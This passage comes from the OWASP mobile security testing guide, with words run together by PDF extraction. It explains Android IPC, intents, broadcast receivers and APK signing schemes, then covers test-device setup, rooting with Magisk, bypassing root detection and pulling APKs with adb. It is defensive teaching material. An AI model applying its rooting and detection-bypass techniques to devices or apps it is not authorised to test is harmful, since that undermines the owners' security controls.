that will share it. As long as content providers aren’t declared, they won’t be exported and can only be calledbytheappthatcreatesthem. ContentprovidersareimplementedthroughaURIaddressingscheme: theyallusethecontent://model. Regardlessof thetypeofsources(SQLitedatabase,flatfile,etc.),theaddressingschemeisalwaysthesame,therebyabstractingthe sources and offering the developer a unique scheme. Content providers offer all regular database operations: create, read,update,delete. Thatmeansthatanyappwithproperrightsinitsmanifestfilecanmanipulatethedatafromother apps. 100\nServices ServicesareAndroidOScomponents(basedontheServiceclass)thatperformtasksinthebackground(dataprocessing, startingintents, andnotifications, etc.) withoutpresentingauserinterface. Servicesaremeanttorunprocesseslong- term. Theirsystemprioritiesarelowerthanthoseofactiveappsandhigherthanthoseofinactiveapps. Therefore,they arelesslikelytobekilledwhenthesystemneedsresources,andtheycanbeconfiguredtoautomaticallyrestartwhen enoughresourcesbecomeavailable. Thismakesservicesagreatcandidateforrunningbackgroundtasks. Pleasenote thatServices,likeActivities,areexecutedinthemainappthread. Aservicedoesnotcreateitsownthreadanddoesnot runinaseparateprocessunlessyouspecifyotherwise. Inter-Process Communication As we’ve already learned, every Android process has its own sandboxed address space. Inter-process communication facilitiesallowappstoexchangesignalsanddatasecurely. InsteadofrelyingonthedefaultLinuxIPCfacilities,Android’s IPC is based on Binder, a custom implementation of OpenBinder. Most Android system services and all high-level IPC servicesdependonBinder. ThetermBinderstandsforalotofdifferentthings,including: • BinderDriver: thekernel-leveldriver • BinderProtocol: low-levelioctl-basedprotocolusedtocommunicatewiththebinderdriver • IBinderInterface: awell-definedbehaviorthatBinderobjectsimplement • Binderobject: genericimplementationoftheIBinderinterface • Binderservice: implementationoftheBinderobject;forexample,locationservice,andsensorservice • Binderclient: anobjectusingtheBinderservice TheBinderframeworkincludesaclient-servercommunicationmodel. TouseIPC,appscallIPCmethodsinproxyobjects. TheproxyobjectstransparentlymarshallthecallparametersintoaparcelandsendatransactiontotheBinderserver, whichisimplementedasacharacterdriver(/dev/binder). Theserverholdsathreadpoolforhandlingincomingrequests anddeliversmessagestothedestinationobject. Fromtheperspectiveoftheclientapp,allofthisseemslikearegular methodcall,alltheheavyliftingisdonebytheBinderframework. • BinderOverview-Imagesource: AndroidBinderbyThorstenSchreiber Servicesthatallowotherapplicationstobindtothemarecalledboundservices. TheseservicesmustprovideanIBinder interface to clients. Developers use the Android Interface Descriptor Language (AIDL) to write interfaces for remote services. ServiceManagerisasystemdaemonthatmanagestheregistrationandlookupofsystemservices. Itmaintainsalistof name/Binderpairsforallregisteredservices. ServicesareaddedwithaddServiceandretrievedbynamewiththestatic getServicemethodinandroid.os.ServiceManager: ExampleinJava: 101\npublic static IBinder getService(Stringname){ try{ IBinderservice =sCache.get(name); if(service !=null){ return service; }else { return getIServiceManager().getService(name); } }catch (RemoteExceptione){ Log.e(TAG,"erroringetService",e); } return null; } ExampleinKotlin: companion object { private valsCache:Map<String,IBinder>=ArrayMap() fungetService(name:String):IBinder?{ try{ valservice =sCache[name] return service ?:getIServiceManager().getService(name) }catch (e:RemoteException){ Log.e(FragmentActivity.TAG,"erroringetService",e) } return null } } Youcanquerythelistofsystemserviceswiththeservice listcommand. $adbshellservicelist Found99services: 0carrier_config: [com.android.internal.telephony.ICarrierConfigLoader] 1phone: [com.android.internal.telephony.ITelephony] 2isms: [com.android.internal.telephony.ISms] 3iphonesubinfo: [com.android.internal.telephony.IPhoneSubInfo] Intents IntentmessagingisanasynchronouscommunicationframeworkbuiltontopofBinder. Thisframeworkallowsbothpoint- to-pointandpublish-subscribemessaging. AnIntent isamessagingobjectthatcanbeusedtorequestanactionfrom another app component. Although intents facilitate inter-component communication in several ways, there are three fundamentalusecases: • Startinganactivity – An activity represents a single screen in an app. You can start a new instance of an activity by passing an intenttostartActivity. Theintentdescribestheactivityandcarriesnecessarydata. • Startingaservice – AServiceisacomponentthatperformsoperationsinthebackground,withoutauserinterface. WithAndroid 5.0(APIlevel21)andlater,youcanstartaservicewithJobScheduler. • Deliveringabroadcast – Abroadcastisamessagethatanyappcanreceive. Thesystemdeliversbroadcastsforsystemevents,includ- ingsystembootandcharginginitialization. Youcandeliverabroadcasttootherappsbypassinganintentto sendBroadcastorsendOrderedBroadcast. Therearetwotypesofintents. Explicitintentsnamethecomponentthatwillbestarted(thefullyqualifiedclassname). Forinstance: ExampleinJava: Intentintent =newIntent(this,myActivity.myClass); ExampleinKotlin: 102\nvarintent =Intent(this,myActivity.myClass) ImplicitintentsaresenttotheOStoperformagivenactiononagivensetofdata(TheURLoftheOWASPwebsiteinour examplebelow). Itisuptothesystemtodecidewhichapporclasswillperformthecorrespondingservice. Forinstance: ExampleinJava: Intentintent =newIntent(Intent.MY_ACTION,Uri.parse("https://www.owasp.org")); ExampleinKotlin: varintent =Intent(Intent.MY_ACTION,Uri.parse("https://www.owasp.org")) An intent filter is an expression in Android Manifest files that specifies the type of intents the component would like to receive. Forinstance,bydeclaringanintentfilterforanactivity,youmakeitpossibleforotherappstodirectlystartyour activitywithacertainkindofintent. Likewise,youractivitycanonlybestartedwithanexplicitintentifyoudon’tdeclare anyintentfiltersforit. Androidusesintentstobroadcastmessagestoapps(suchasanincomingcallorSMS)importantpowersupplyinformation (lowbattery,forexample),andnetworkchanges(lossofconnection,forinstance). Extradatamaybeaddedtointents (throughputExtra/getExtras). Hereisashortlistofintentssentbytheoperatingsystem. AllconstantsaredefinedintheIntentclass,andthewhole listisintheofficialAndroiddocumentation: • ACTION_CAMERA_BUTTON • ACTION_MEDIA_EJECT • ACTION_NEW_OUTGOING_CALL • ACTION_TIMEZONE_CHANGED To improve security and privacy, a Local Broadcast Manager is used to send and receive intents within an app without havingthemsenttotherestoftheoperatingsystem. Thisisveryusefulforensuringthatsensitiveandprivatedatadon’t leavetheappperimeter(geolocationdataforinstance). Broadcast Receivers BroadcastReceiversarecomponentsthatallowappstoreceivenotificationsfromotherappsandfromthesystemitself. With them, apps can react to events (internal, initiated by other apps, or initiated by the operating system). They are generallyusedtoupdateuserinterfaces,startservices,updatecontent,andcreateusernotifications. TherearetwowaystomakeaBroadcastReceiverknowntothesystem. OnewayistodeclareitintheAndroidManifest file. ThemanifestshouldspecifyanassociationbetweentheBroadcastReceiverandanintentfiltertoindicatetheactions thereceiverismeanttolistenfor. AnexampleBroadcastReceiverdeclarationwithanintentfilterinamanifest: <receiver android:name=".MyReceiver" > <intent-filter> <action android:name="com.owasp.myapplication.MY_ACTION" /> </intent-filter> </receiver> Pleasenotethatinthisexample,theBroadcastReceiverdoesnotincludetheandroid:exportedattribute. Asatleast onefilterwasdefined,thedefaultvaluewillbesetto“true”. Inabsenceofanyfilters,itwillbesetto“false”. Theotherwayistocreatethereceiverdynamicallyincode. ThereceivercanthenregisterwiththemethodContext. registerReceiver. AnexampleofregisteringaBroadcastReceiverdynamically: ExampleinJava: 103\n//Defineabroadcastreceiver BroadcastReceivermyReceiver =newBroadcastReceiver(){ @Override public void onReceive(Contextcontext,Intentintent){ Log.d(TAG,"IntentreceivedbymyReceiver"); } }; //Defineanintentfilterwithactionsthatthebroadcastreceiverlistensfor IntentFilterintentFilter =newIntentFilter(); intentFilter.addAction("com.owasp.myapplication.MY_ACTION"); //Toregisterthebroadcastreceiver registerReceiver(myReceiver,intentFilter); //Toun-registerthebroadcastreceiver unregisterReceiver(myReceiver); ExampleinKotlin: //Defineabroadcastreceiver valmyReceiver:BroadcastReceiver =object :BroadcastReceiver(){ override funonReceive(context:Context,intent:Intent){ Log.d(FragmentActivity.TAG,"IntentreceivedbymyReceiver") } } //Defineanintentfilterwithactionsthatthebroadcastreceiverlistensfor valintentFilter =IntentFilter() intentFilter.addAction("com.owasp.myapplication.MY_ACTION") //Toregisterthebroadcastreceiver registerReceiver(myReceiver,intentFilter) //Toun-registerthebroadcastreceiver unregisterReceiver(myReceiver) Notethatthesystemstartsanappwiththeregisteredreceiverautomaticallywhenarelevantintentisraised. According to Broadcasts Overview, a broadcast is considered “implicit” if it does not target an app specifically. After receivinganimplicitbroadcast,Androidwilllistallappsthathaveregisteredagivenactionintheirfilters. Ifmorethan oneapphasregisteredforthesameaction,Androidwillprompttheusertoselectfromthelistofavailableapps. An interesting feature of Broadcast Receivers is that they can be prioritized; this way, an intent will be delivered to all authorized receivers according to their priority. A priority can be assigned to an intent filter in the manifest via the android:priority attribute as well as programmatically via the IntentFilter.setPriority method. However, note thatreceiverswiththesameprioritywillberuninanarbitraryorder. Ifyourappisnotsupposedtosendbroadcastsacrossapps,useaLocalBroadcastManager(LocalBroadcastManager). Theycanbeusedtomakesureintentsarereceivedfromtheinternalapponly, andanyintentfromanyotherappwill bediscarded. Thisisveryusefulforimprovingsecurityandtheefficiencyoftheapp,asnointerprocesscommunication isinvolved. However,pleasenotethattheLocalBroadcastManagerclassisdeprecatedandGooglerecommendsusing alternativessuchasLiveData. FormoresecurityconsiderationsregardingBroadcastReceiver,seeSecurityConsiderationsandBestPractices. Implicit Broadcast Receiver Limitation AccordingtoBackgroundOptimizations,appstargetingAndroid7.0(APIlevel24)orhighernolongerreceiveCONNECTIV- ITY_ACTION broadcast unless they register their Broadcast Receivers with Context.registerReceiver(). The system doesnotsendACTION_NEW_PICTUREandACTION_NEW_VIDEObroadcastsaswell. According to Background Execution Limits, apps that target Android 8.0 (API level 26) or higher can no longer register BroadcastReceiversforimplicitbroadcastsintheirmanifest,exceptforthoselistedinImplicitBroadcastExceptions. The BroadcastReceiverscreatedatruntimebycallingContext.registerReceiverarenotaffectedbythislimitation. AccordingtoChangestoSystemBroadcasts,beginningwithAndroid9(APIlevel28),theNETWORK_STATE_CHANGED_ACTION broadcastdoesn’treceiveinformationabouttheuser’slocationorpersonallyidentifiabledata. Android Application Publishing Onceanapphasbeensuccessfullydeveloped,thenextstepistopublishandshareitwithothers. However,appscan’t simplybeaddedtoastoreandshared,theymustbefirstsigned. Thecryptographicsignatureservesasaverifiablemark placedbythedeveloperoftheapp. Itidentifiestheapp’sauthorandensuresthattheapphasnotbeenmodifiedsince itsinitialdistribution. 104\nSigning Process Duringdevelopment,appsaresignedwithanautomaticallygeneratedcertificate. Thiscertificateisinherentlyinsecure andisfordebuggingonly. Moststoresdon’tacceptthiskindofcertificateforpublishing;therefore,acertificatewithmore securefeaturesmustbecreated. WhenanapplicationisinstalledontheAndroiddevice,thePackageManagerensures thatithasbeensignedwiththecertificateincludedinthecorrespondingAPK.Ifthecertificate’spublickeymatchesthe key used to sign any other APK on the device, the new APK may share a UID with the pre-existing APK. This facilitates interactionsbetweenapplicationsfromasinglevendor. Alternatively, specifyingsecuritypermissionsfortheSignature protectionlevelispossible;thiswillrestrictaccesstoapplicationsthathavebeensignedwiththesamekey. APK Signing Schemes Androidsupportsthreeapplicationsigningschemes. StartingwithAndroid9(APIlevel28),APKscanbeverifiedwithAPK SignatureSchemev3(v3scheme),APKSignatureSchemev2(v2scheme)orJARsigning(v1scheme). ForAndroid7.0 (APIlevel24)andabove,APKscanbeverifiedwiththeAPKSignatureSchemev2(v2scheme)orJARsigning(v1scheme). Forbackwardscompatibility,anAPKcanbesignedwithmultiplesignatureschemesinordertomaketheapprunonboth newerandolderSDKversions. Olderplatformsignorev2signaturesandverifyv1signaturesonly. JAR Signing (v1 Scheme) TheoriginalversionofappsigningimplementsthesignedAPKasastandardsignedJAR,whichmustcontainalltheentries inMETA-INF/MANIFEST.MF.Allfilesmustbesignedwithacommoncertificate. Thisschemedoesnotprotectsomeparts oftheAPK,suchasZIPmetadata. ThedrawbackofthisschemeisthattheAPKverifierneedstoprocessuntrusteddata structures before applying the signature, and the verifier discards data the data structures don’t cover. Also, the APK verifiermustdecompressallcompressedfiles,whichtakesconsiderabletimeandmemory. APK Signature Scheme (v2 Scheme) WiththeAPKsignaturescheme,thecompleteAPKishashedandsigned,andanAPKSigningBlockiscreatedandinserted intotheAPK.Duringvalidation,thev2schemechecksthesignaturesoftheentireAPKfile. ThisformofAPKverificationis fasterandoffersmorecomprehensiveprotectionagainstmodification. YoucanseetheAPKsignatureverificationprocess forv2Schemebelow. APK Signature Scheme (v3 Scheme) Thev3APKSigningBlockformatisthesameasv2. V3addsinformationaboutthesupportedSDKversionsandaproof- of-rotationstructtotheAPKsigningblock. InAndroid9(APIlevel28)andhigher,APKscanbeverifiedaccordingtoAPK SignatureSchemev3,v2orv1scheme. Olderplatformsignorev3signaturesandtrytoverifyv2thenv1signature. 105\nThe proof-of-rotation attribute in the signed-data of the signing block consists of a singly-linked list, with each node containingasigningcertificateusedtosignpreviousversionsoftheapp. Tomakebackwardcompatibilitywork,theold signingcertificatessignthenewsetofcertificates,thusprovidingeachnewkeywithevidencethatitshouldbeastrusted astheolderkey(s). ItisnolongerpossibletosignAPKsindependently,becausetheproof-of-rotationstructuremusthave theoldsigningcertificatessigningthenewsetofcertificates,ratherthansigningthemone-by-one. YoucanseetheAPK signaturev3schemeverificationprocessbelow. APK Signature Scheme (v4 Scheme) TheAPKSignatureSchemev4wasintroducedalongwithAndroid11(APIlevel30)andrequiresalldeviceslaunchedwith Android11anduptohavefs-verityenabledbydefault. fs-verityisaLinuxkernelfeaturethatisprimarilyusedforfile authentication (detection of malicious modifications) due to its extremely efficient file hash calculation. Read requests onlywillsucceedifthecontentverifiesagainsttrusteddigitalcertificatesthatwereloadedtothekernelkeyringduring boottime. The v4 signature requires a complementary v2 or v3 signature and in contrast to previous signature schemes, the v4 signature is stored in a separate file <apk name>.apk.idsig. Remember to specify it using the --v4-signature-file flagwhenverifyingav4-signedAPKwithapksigner verify. YoucanfindmoredetailedinformationintheAndroiddeveloperdocumentation. Creating Your Certificate Androidusespublic/privatecertificatestosignAndroidapps(.apkfiles). Certificatesarebundlesofinformation;interms of security, keys are the most important part of that bundle. Public certificates contain users’ public keys, and private certificates contain users’ private keys. Public and private certificates are linked. Certificates are unique and can’t be re-generated. Notethatifacertificateislost,itcannotberecovered,soupdatinganyappssignedwiththatcertificate becomesimpossible. Appcreatorscaneitherreuseanexistingprivate/publickeypairthatisinanavailableKeyStoreor generateanewpair. IntheAndroidSDK,anewkeypairisgeneratedwiththekeytoolcommand. Thefollowingcommand createsaRSAkeypairwithakeylengthof2048bitsandanexpirytimeof7300days=20years. Thegeneratedkeypair isstoredinthefile‘myKeyStore.jks’,whichisinthecurrentdirectory: keytool -genkey -alias myDomain -keyalg RSA-keysize 2048 -validity 7300 -keystore myKeyStore.jks -storepass myStrongPassword Safelystoringyoursecretkeyandmakingsureitremainssecretduringitsentirelifecycleisofparamountimportance. Anyone who gains access to the key will be able to publish updates to your apps with content that you don’t control (therebyaddinginsecurefeaturesoraccessingsharedcontentwithsignature-basedpermissions). Thetrustthatauser placesinanappanditsdevelopersisbasedtotallyonsuchcertificates;certificateprotectionandsecuremanagement are therefore vital for reputation and customer retention, and secret keys must never be shared with other individuals. Keysarestoredinabinaryfilethatcanbeprotectedwithapassword;suchfilesarereferredtoasKeyStores. KeyStore passwordsshouldbestrongandknownonlytothekeycreator. Forthisreason,keysareusuallystoredonadedicated 106\nbuild machine that developers have limited access to. An Android certificate must have a validity period that’s longer thanthatoftheassociatedapp(includingupdatedversionsoftheapp). Forexample,GooglePlaywillrequirecertificates toremainvaliduntilOct22nd,2033atleast. Signing an Application The goal of the signing process is to associate the app file (.apk) with the developer’s public key. To achieve this, the developercalculatesahashoftheAPKfileandencryptsitwiththeirownprivatekey. Thirdpartiescanthenverifythe app’sauthenticity(e.g.,thefactthattheappreallycomesfromtheuserwhoclaimstobetheoriginator)bydecrypting theencryptedhashwiththeauthor’spublickeyandverifyingthatitmatchestheactualhashoftheAPKfile. Many Integrated Development Environments(IDE) integrate the app signing process to makeit easier for the user. Be awarethatsomeIDEsstoreprivatekeysincleartextinconfigurationfiles;double-checkthisincaseothersareableto accesssuchfilesandremovetheinformationifnecessary. Appscanbesignedfromthecommandlinewiththe‘apksigner’ toolprovidedbytheAndroidSDK(APIlevel24andhigher). Itislocatedat[SDK-Path]/build-tools/[version]. ForAPI 24.0.2andbelow,youcanuse‘jarsigner’,whichispartoftheJavaJDK.Detailsaboutthewholeprocesscanbefoundin officialAndroiddocumentation;however,anexampleisgivenbelowtoillustratethepoint. apksignersign --out mySignedApp.apk --ks myKeyStore.jksmyUnsignedApp.apk Inthisexample,anunsignedapp(‘myUnsignedApp.apk’)willbesignedwithaprivatekeyfromthedeveloperKeyStore ‘myKeyStore.jks’(locatedinthecurrentdirectory). Theappwillbecomeasignedappcalled‘mySignedApp.apk’andwill bereadytoreleasetostores. Zipalign ThezipaligntoolshouldalwaysbeusedtoaligntheAPKfilebeforedistribution. Thistoolalignsalluncompresseddata (suchasimages,rawfiles,and4-byteboundaries)withintheAPK,whichhelpsimprovememorymanagementduringapp runtime. ZipalignmustbeusedbeforetheAPKfileissignedwithapksigner. Publishing Process Distributing apps from anywhere (your own site, any store, etc.) is possible because the Android ecosystem is open. However,GooglePlayisthemostwell-known,trusted,andpopularstore,andGoogleitselfprovidesit. AmazonAppstore is the trusted default store for Kindle devices. If users want to install third-party apps from a non-trusted source, they mustexplicitlyallowthiswiththeirdevicesecuritysettings. Apps can be installed on an Android device from a variety of sources: locally via USB, via Google’s official app store (GooglePlayStore)orfromalternativestores. Whereas other vendors may review and approve apps before they are actually published, Google will simply scan for known malware signatures; this minimizes the time between the beginning of the publishing process and public app availability. Publishing an app is quite straightforward; the main operation is making the signed APK file downloadable. On Google Play, publishingstartswithaccountcreationandisfollowedbyappdeliverythroughadedicatedinterface. Detailsare availableattheofficialAndroiddocumentation. 107\nAndroid Security Testing Inthischapter,we’lldiveintosettingupasecuritytestingenvironmentandintroduceyoutosomepracticalprocesses andtechniquesfortestingthesecurityofAndroidapps. ThesearethebuildingblocksfortheMASTGtestcases. Android Testing Setup YoucansetupafullyfunctioningtestenvironmentonalmostanymachinerunningWindows,Linux,ormacOS. Host Device At the very least, you’ll need Android Studio (which comes with the Android SDK) platform tools, an emulator, and an apptomanagethevariousSDKversionsandframeworkcomponents. AndroidStudioalsocomeswithanAndroidVirtual Device(AVD)Managerapplicationforcreatingemulatorimages. MakesurethatthenewestSDKtoolsandplatformtools packagesareinstalledonyoursystem. Inaddition,youmaywanttocompleteyourhostsetupbyinstallingtheAndroidNDKifyou’replanningtoworkwithapps containingnativelibraries. Sometimesitcanbeusefultodisplayorcontroldevicesfromthecomputer. Toachievethis,youcanuseScrcpy. Testing Device For dynamic analysis, you’ll need an Android device to run the target app on. In principle, you can test without a real Androiddeviceanduseonlytheemulator. However, appsexecutequiteslowlyonaemulator, andsimulatorsmaynot giverealisticresults. Testingonarealdevice makesfora smootherprocessandamorerealisticenvironment. On the otherhand,emulatorsallowyoutoeasilychangeSDKversionsorcreatemultipledevices. Afulloverviewoftheprosand consofeachapproachislistedinthetablebelow. Property Physical Emulator/Simulator Abilitytorestore Softbricksarealwayspossible,but Emulatorscancrashorbecome newfirmwarecantypicallystillbe corrupt,butanewonecanbecreated flashed. Hardbricksareveryrare. orasnapshotcanberestored. Reset Canberestoredtofactorysettingsor Emulatorscanbedeletedand reflashed. recreated. Snapshots Notpossible. Supported,greatformalware analysis. Speed Muchfasterthanemulators. Typicallyslow,butimprovementsare beingmade. Cost Typicallystartat$200forausable Bothfreeandcommercialsolutions device. Youmayrequiredifferent exist. devices,suchasonewithorwithouta biometricsensor. Easeofrooting Highlydependentonthedevice. Typicallyrootedbydefault. Easeofemulatordetection It’snotanemulator,soemulator Manyartefactswillexist,makingit checksarenotapplicable. easytodetectthattheappisrunning inanemulator. Easeofrootdetection Easiertohideroot,asmanyroot Emulatorswillalmostalwaystrigger detectionalgorithmscheckfor rootdetectionalgorithmsduetothe emulatorproperties. WithMagisk factthattheyarebuiltfortestingwith Systemlessrootit’snearlyimpossible manyartefactsthatcanbefound. todetect. 108\nProperty Physical Emulator/Simulator Hardwareinteraction EasyinteractionthroughBluetooth, Usuallyfairlylimited,withemulated NFC,4G,Wi-Fi,biometrics,camera, hardwareinput(e.g.randomGPS GPS,gyroscope,... coordinates) APIlevelsupport Dependsonthedeviceandthe Alwayssupportsthelatestversions, community. Activecommunitieswill includingbetareleases. Emulators keepdistributingupdatedversions containingspecificAPIlevelscan (e.g.LineageOS),whilelesspopular easilybedownloadedandlaunched. devicesmayonlyreceiveafew updates. Switchingbetweenversions requiresflashingthedevice,atedious process. Nativelibrarysupport Nativelibrariesareusuallybuiltfor Someemulatorsrunonx86CPUs,so ARMdevices,sotheywillworkona theymaynotbeabletorunpackaged physicaldevice. nativelibraries. Malwaredanger Malwaresamplescaninfectadevice, Malwaresamplescaninfectan butifyoucanclearoutthedevice emulator,buttheemulatorcansimply storageandflashacleanfirmware, beremovedandrecreated. Itisalso therebyrestoringittofactory possibletocreatesnapshotsand settings,thisshouldnotbeaproblem. comparedifferentsnapshotstohelp Beawarethattherearemalware inmalwareanalysis. Beawarethat samplesthattrytoexploittheUSB therearemalwareproofsofconcept bridge. whichtrytoattackthehypervisor. Testing on a Real Device Almostanyphysicaldevicecanbeusedfortesting,butthereareafewconsiderationstobemade. First,thedeviceneeds toberootable. Thisistypicallyeitherdonethroughanexploit,orthroughanunlockedbootloader. Exploitsarenotalways available,andthebootloadermaybelockedpermanently,oritmayonlybeunlockedoncethecarriercontracthasbeen terminated. The best candidates are flagship Google pixel devices built for developers. These devices typically come with an un- lockable bootloader, opensource firmware, kernel, radio available online and official OS source code. The developer communitiespreferGoogledevicesastheOSisclosesttotheandroidopensourceproject. Thesedevicesgenerallyhave thelongestsupportwindowswith2yearsofOSupdatesand1yearofsecurityupdatesafterthat. Alternatively,Google’sAndroidOneprojectcontainsdevicesthatwillreceivethesamesupportwindows(2yearsofOS updates, 1 year of security updates) and have near-stock experiences. While it was originally started as a project for low-enddevices,theprogramhasevolvedtoincludemid-rangeandhigh-endsmartphones,manyofwhichareactively supportedbythemoddingcommunity. DevicesthataresupportedbytheLineageOSprojectarealsoverygoodcandidatesfortestdevices. Theyhaveanactive community,easytofollowflashingandrootinginstructionsandthelatestAndroidversionsaretypicallyquicklyavailable as a Lineage installation. LineageOS also continues support for new Android versions long after the OEM has stopped distributingupdates. WhenworkingwithanAndroidphysicaldevice,you’llwanttoenableDeveloperModeandUSBdebuggingonthedevice inordertousetheADBdebugginginterface. SinceAndroid4.2(APIlevel16),theDeveloperoptionssubmenuinthe Settingsappishiddenbydefault. Toactivateit,taptheBuild numbersectionoftheAbout phoneviewseventimes. Notethatthebuildnumberfield’slocationvariesslightlybydevice. Forexample,onLGPhones,itisunderAboutphone ->Softwareinformation. Onceyouhavedonethis,DeveloperoptionswillbeshownatbottomoftheSettingsmenu. Oncedeveloperoptionsareactivated,youcanenabledebuggingwiththeUSBdebuggingswitch. Testing on an Emulator Multipleemulatorsexist,onceagainwiththeirownstrengthsandweaknesses: Freeemulators: 109\n• AndroidVirtualDevice(AVD)-Theofficialandroidemulator,distributedwithAndroidStudio. • AndroidX86-Anx86portoftheAndroidcodebase Commercialemulators: • Genymotion-Matureemulatorwithmanyfeatures,bothaslocalandcloud-basedsolution. Freeversionavailable fornon-commercialuse. • Corellium-Offerscustomdevicevirtualizationthroughacloud-basedoron-premsolution. AlthoughthereexistseveralfreeAndroidemulators,werecommendusingAVDasitprovidesenhancedfeaturesappro- priatefortestingyourappcomparedtotheothers. Intheremainderofthisguide,wewillusetheofficialAVDtoperform tests. AVDsupportssomehardwareemulation,suchasGPSorSMSthroughitsso-calledExtendedControlsaswellasmotion sensors. YoucaneitherstartanAndroidVirtualDevice(AVD)byusingtheAVDManagerinAndroidStudioorstarttheAVDmanager fromthecommandlinewiththeandroidcommand,whichisfoundinthetoolsdirectoryoftheAndroidSDK: ./androidavd SeveraltoolsandVMsthatcanbeusedtotestanappwithinanemulatorenvironmentareavailable: • MobSF • Nathan(notupdatedsince2016) Pleasealsoverifythe“TestingTools”chapterattheendofthisbook. Getting Privileged Access Rooting (i.e., modifying the OS so that you can run commands as the root user) is recommended for testing on a real device. Thisgivesyoufullcontrolovertheoperatingsystemandallowsyoutobypassrestrictionssuchasappsandboxing. Theseprivilegesinturnallowyoutousetechniqueslikecodeinjectionandfunctionhookingmoreeasily. Notethatrootingisrisky,andthreemainconsequencesneedtobeclarifiedbeforeyouproceed. Rootingcanhavethe followingnegativeeffects: • voidingthedevicewarranty(alwayscheckthemanufacturer’spolicybeforetakinganyaction) • “bricking”thedevice,i.e.,renderingitinoperableandunusable • creatingadditionalsecurityrisks(becausebuilt-inexploitmitigationsareoftenremoved) Youshouldnotrootapersonaldevicethatyoustoreyourprivateinformationon. Werecommendgettingacheap,dedi- catedtestdeviceinstead. Manyolderdevices,suchasGoogle’sNexusseries,canrunthenewestAndroidversionsand areperfectlyfinefortesting. You need to understand that rooting your device is ultimately YOUR decision and that OWASP shall in no waybeheldresponsibleforanydamage. Ifyou’reuncertain,seekexpertadvicebeforestartingtherooting process. Which Mobiles Can Be Rooted Virtually any Android mobile can be rooted. Commercial versions of Android OS (which are Linux OS evolutions at the kernellevel)areoptimizedforthemobileworld. Somefeatureshavebeenremovedordisabledfortheseversions, for example,non-privilegedusers’abilitytobecomethe‘root’user(whohaselevatedprivileges). Rootingaphonemeans allowinguserstobecometherootuser,e.g.,addingastandardLinuxexecutablecalledsu,whichisusedtochangeto anotheruseraccount. Torootamobiledevice,firstunlockitsbootloader. Theunlockingproceduredependsonthedevicemanufacturer. How- ever,forpracticalreasons,rootingsomemobiledevicesismorepopularthanrootingothers,particularlywhenitcomesto securitytesting: devicescreatedbyGoogleandmanufacturedbycompanieslikeSamsung,LG,andMotorolaareamong themostpopular,particularlybecausetheyareusedbymanydevelopers. Thedevicewarrantyisnotnullifiedwhenthe bootloaderisunlockedandGoogleprovidesmanytoolstosupporttherootitself. 110\nRooting with Magisk Magisk(“MagicMask”)isonewaytorootyourAndroiddevice. Itsspecialtyliesinthewaythemodificationsonthesystem areperformed. Whileotherrootingtoolsaltertheactualdataonthesystempartition,Magiskdoesnot(whichiscalled “systemless”). Thisenablesawaytohidethemodificationsfromroot-sensitiveapplications(e.g.forbankingorgames) andallowsusingtheofficialAndroidOTAupgradeswithouttheneedtounrootthedevicebeforehand. YoucangetfamiliarwithMagiskreadingtheofficialdocumentationonGitHub. Ifyoudon’thaveMagiskinstalled,youcan findinstallationinstructionsinthedocumentation. IfyouuseanofficialAndroidversionandplantoupgradeit,Magisk providesatutorialonGitHub. Furthermore,developerscanusethepowerofMagisktocreatecustommodulesandsubmitthemtotheofficialMagisk Modules repository. Submitted modules can then be installed inside the Magisk Manager application. One of these installablemodulesisasystemlessversionofthefamousXposedFramework(availableforSDKversionsupto27). Root Detection Anextensivelistofrootdetectionmethodsispresentedinthe“TestingAnti-ReversingDefensesonAndroid”chapter. Foratypicalmobileappsecuritybuild, you’llusuallywanttotestadebugbuildwithrootdetectiondisabled. Ifsucha buildisnotavailablefortesting, youcandisablerootdetectioninavarietyofwaysthatwillbeintroducedlaterinthis book. Installing Apps Platform: android Useadb installtoinstallanAPKonanemulatororconnecteddevice. adbinstallpath_to_apk NotethatifyouhavetheoriginalsourcecodeanduseAndroidStudio,youdonotneedtodothisbecauseAndroidStudio handlesthepackagingandinstallationoftheappforyou. Obtaining and Extracting Apps Platform: android There are several ways of extracting APK files from a device. You will need to decide which one is the easiest method dependingiftheappispublicorprivate. Alternative App Stores One of the easiest options is to download the APK from websites that mirror public applications from the Google Play Store. However,keepinmindthatthesesitesarenotofficialandthereisnoguaranteethattheapplicationhasn’tbeen repackagedorcontainmalware. AfewreputablewebsitesthathostAPKsandarenotknownformodifyingappsandeven listSHA-1andSHA-256checksumsoftheappsare: • APKMirror • APKPure Beware that you do not have control over these sites and you cannot guarantee what they do in the future. Only use themifit’syouronlyoptionleft. 111\nUsing gplaycli Youcanusegplayclitodownload(-d)theselectedAPKbyspecifyingitsAppID(add-ptoshowaprogressbarand-vfor verbosity): $gplaycli -p-v-dcom.google.android.keep [INFO]GPlayCliversion3.26 [Python3.7.4] [INFO]Configurationfileis~/.config/gplaycli/gplaycli.conf [INFO]Deviceisbacon [INFO]Usingcachedtoken. [INFO]UsingautoretrievedtokentoconnecttoAPI [INFO]1/1com.google.android.keep [################################]15.78MB/15.78MB -00:00:026.57MB/s/s [INFO]Downloadcomplete Thecom.google.android.keep.apkfilewillbeinyourcurrentdirectory. Asyoumightimagine,thisapproachisavery convenientwaytodownloadAPKs,especiallywithregardstoautomation. YoumayuseyourownGooglePlaycredentialsortoken. Bydefault,gplaycliwilluseaninternallyprovidedtoken. Extracting the App Package from the Device Obtainingapppackagesfromthedeviceistherecommendedmethodaswecanguaranteetheapphasn’tbeenmodified byathird-party. Toobtainapplicationsfromarootedornon-rooteddevice,youcanusethefollowingmethods: UseadbpulltoretrievetheAPK.Ifyoudon’tknowthepackagename,thefirststepistolistalltheapplicationsinstalled onthedevice: adbshellpmlistpackages Onceyouhavelocatedthepackagenameoftheapplication,youneedthefullpathwhereitisstoredonthesystemto downloadit. adbshellpmpath <packagename> WiththefullpathtotheAPK,youcannowsimplyuseadb pulltoextractit. adbpull <apkpath> TheAPKwillbedownloadedinyourworkingdirectory. Alternatively, there are also apps like APK Extractor that do not require root and can even share the extracted APK via yourpreferredmethod. Thiscanbeusefulifyoudon’tfeellikeconnectingthedeviceorsettingupadboverthenetwork totransferthefile. Testing Instant Apps With Google Play Instant you can create Instant apps which can be instantly launched from a browser or the “try now” buttonfromtheappstorefromAndroid5.0(APIlevel21)onward. Theydonotrequireanyformofinstallation. Thereare afewchallengeswithaninstantapp: • Thereisalimitedamountofsizeyoucanhavewithaninstantapp. • Onlyareducednumberofpermissionscanbeused,whicharedocumentedatAndroidInstantappdocumentation. Thecombinationofthesecanleadtoinsecuredecisions,suchas:strippingtoomuchoftheauthorization/authentication/confidentiality logicfromanapp,whichallowsforinformationleakage. 